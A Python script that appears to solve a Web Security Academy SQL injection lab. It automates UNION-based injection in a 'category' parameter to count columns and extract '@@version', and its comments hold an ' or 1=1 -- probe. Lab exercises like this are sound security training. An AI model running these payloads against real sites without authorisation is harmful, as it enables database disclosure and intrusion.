import requests
from typing import Optional, Any

BASE_URL = "https://0a5e00f804867a7f8d661f7500b10005.web-security-academy.net/filter"
session = requests.Session()

def send_get_request(url:str, params:dict[str, Any], timeout:int=10) -> Optional[requests.Response]:
    try:
        return session.get(url, params=params, timeout=timeout)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None
    
def find_columns(max_columns:int = 20) -> Optional[int]:
    for num in range(1, max_columns+1):
        payload = f"' union select {",".join(["NULL"] * num )} -- "
        response = send_get_request(BASE_URL, {"category":payload})
        if response and response.status_code==200:
            print(f"sqi successs payload:{payload}")
            return num
        
def create_union(columns:int, str_idx:int) -> Optional[str]:
    arrs = ["NULL"] * columns
    arrs[str_idx] = "@@version"
    return f"' union select {",".join(arrs)} -- "

def extract_oracle_content_keyword(text: str, key_word: str):
    """
    從文字中抓出包含指定關鍵字的片段，
    片段範圍是從 '>' 到 '<'，並保留其中的文字。
    """
    import re
    pattern = re.compile(rf'>([^<>]*?{re.escape(key_word)}[^<>]*?)<', re.IGNORECASE)
    matches = pattern.findall(text)
    return matches

def main():
    # response = send_get_request(BASE_URL, {"category":"Gifts"})
    # if response and response.status_code==200:
    #     print("connect successs")

    # response = send_get_request(BASE_URL, {"category":"' or 1=1 -- "})
    # if response and response.status_code==200:
    #     print("sqi successs")

    columns = find_columns()
    print(f"columns:{columns}")
    response = send_get_request(BASE_URL, {"category":create_union(columns, 0)})
    if response and response.status_code==200:
        # print(response.text)
        results = extract_oracle_content_keyword(response.text, "ubuntu")
        for r in results:
            print(r)

    

if __name__== "__main__":
    main()